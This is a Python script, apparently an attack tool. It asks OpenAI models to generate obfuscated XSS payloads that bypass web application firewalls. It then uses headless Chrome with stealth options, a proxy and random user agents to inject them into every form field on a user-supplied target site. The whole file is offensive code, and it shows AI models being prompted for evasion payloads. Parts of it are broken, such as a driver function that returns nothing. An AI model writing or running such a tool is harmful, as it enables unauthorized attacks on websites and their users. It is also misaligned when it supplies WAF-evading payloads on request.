import os
import random
import sys
import base64
import time
import json
import argparse
import logging
import re
import requests
from openai import OpenAI
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager

# === Configuration ===
API_KEY = ""

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64)"
]

PROXIES = {
    "http": "http://your-proxy.com:8080",
    "https": "https://your-proxy.com:8080",
}

# === Logging Setup ===
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

# === Initialize OpenAI ===
client = OpenAI(api_key=API_KEY)

# Ask target URL at runtime if not hardcoded
TARGET_URL = None

# Function: Ask URL input
def get_target_url():
    global TARGET_URL
    if not TARGET_URL:
        TARGET_URL = input("🌐 Enter target URL (e.g., http://example.com): ").strip()
    if not TARGET_URL.startswith("http"):
        print("❌ Invalid URL. Must start with http or https.")
        exit(1)
    return TARGET_URL
    
# === WebDriver Initialization (Stealth Mode) ===
def get_driver():
    chrome_driver_path = "/usr/bin/chromedriver"
    chrome_options = Options()
    chrome_options.add_argument('--headless')
    chrome_options.add_argument('--disable-gpu')
    chrome_options.add_argument('--no-sandbox')
    chrome_options.add_argument("--disable-blink-features=AutomationControlled")

    service = Service("/usr/bin/chromedriver")
    driver = webdriver.Chrome(service=service, options=chrome_options)

# === Fetch URL with Random User-Agent & Proxy ===
def fetch_url(target_url):
    headers = {"User-Agent": random.choice(USER_AGENTS)}
    try:
        response = requests.get(target_url, headers=headers, proxies=PROXIES, timeout=10)
        return response.text
    except requests.RequestException as e:
        logging.error(f"Request failed: {e}")
        return None

# === AI-Powered Security Analysis ===
def analyze_security(target_url):
    logging.info(f"Analyzing security for: {target_url}")
    page_source = fetch_url(target_url)
    if page_source:
        logging.info(f"[🔍] Security Headers Found: {page_source[:500]}")
    else:
        logging.warning(f"Failed to fetch {target_url}")

# Function: Generate advanced XSS payload using AI
def generate_xss_payload():
    prompt = """Generate an advanced XSS payload that can bypass modern WAFs. 
    Avoid using basic <script> tags. Use obfuscation, event-based execution, or encoding techniques. 
    Make it dynamic and mutation-based."""

    try:
        response = client.chat.completions.create(
            model="gpt-4",
            messages=[{"role": "user", "content": prompt}]
        )
    except Exception as e:
        print(f"[⚠️] GPT-4 failed. Falling back to GPT-3.5: {str(e)}")
        response = client.chat.completions.create(
            model="gpt-3.5-turbo",
            messages=[{"role": "user", "content": prompt}]
        )

    return response.choices[0].message.content.strip()

def get_all_forms():
    forms = driver.find_elements(By.TAG_NAME, "form")
    return forms

# Function: Analyze page
def analyze_webpage(driver):
    target = get_target_url()
    print(f"[🔍] Analyzing Webpage: {target}")
    driver.get(target)
    time.sleep(2)
    scripts = driver.execute_script("return document.scripts.length")
    headers = driver.execute_script("return Object.keys(performance.getEntriesByType('resource'))")
    print(f"[INFO] Scripts on Page: {scripts}, Security Headers: {headers}")
    return {"scripts": scripts, "headers": headers}

# === Inject Payload into Forms ===
def inject_payload(driver, target_url):
    driver.get(target_url)
    time.sleep(2)
    
    forms = driver.find_elements(By.TAG_NAME, "form")
    if not forms:
        logging.warning("[⚠️] No forms found on page.")
        return

    payload = generate_xss_payload()
    if not payload:
        logging.error("[❌] Failed to generate payload.")
        return

    for form in forms:
        inputs = form.find_elements(By.TAG_NAME, "input")
        for input_field in inputs:
            try:
                input_field.clear()
                input_field.send_keys(payload)
                form.submit()
                logging.info(f"[✅] Payload submitted: {payload}")
            except Exception as e:
                logging.error(f"[x] Injection error: {e}")

# === Detect if Payload is Reflected in Page ===
def detect_reflected_payload(driver, payload):
    page_source = driver.page_source
    if payload in page_source:
        logging.info(f"[🎯] Payload reflected in DOM! Payload: {payload}")
        return True
    return False

# === Screenshot Function for Evidence ===
def take_screenshot(driver, filename="screenshot.png"):
    driver.save_screenshot(filename)
    logging.info(f"[📸] Screenshot saved as {filename}")

# Function: Execute XSS
def execute_xss_attack():
    options = Options()
    options.add_argument("--headless")
    options.add_argument("--disable-gpu")
    options.add_argument("--no-sandbox")
    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)

    try:
        analyze_webpage(driver)
        print("[⚡] Executing AI-Powered XSS Attack...")
        xss_payload = generate_xss_payload()
        print(f"[💉] Payload Generated:\n{xss_payload}")

        form_fields = driver.find_elements("tag name", "input")
        if form_fields:
            random.choice(form_fields).send_keys(xss_payload)
            submit_buttons = driver.find_elements("tag name", "button")
            if submit_buttons:
                submit_buttons[0].click()
            print("[✅] Payload injected. Monitor response manually or via logs.")
        else:
            print("[❌] No input fields found.")

    except Exception as e:
        print(f"[🔥] Exception during XSS attack: {e}")
    finally:
        driver.quit()

# Run
if __name__ == "__main__":
    execute_xss_attack()
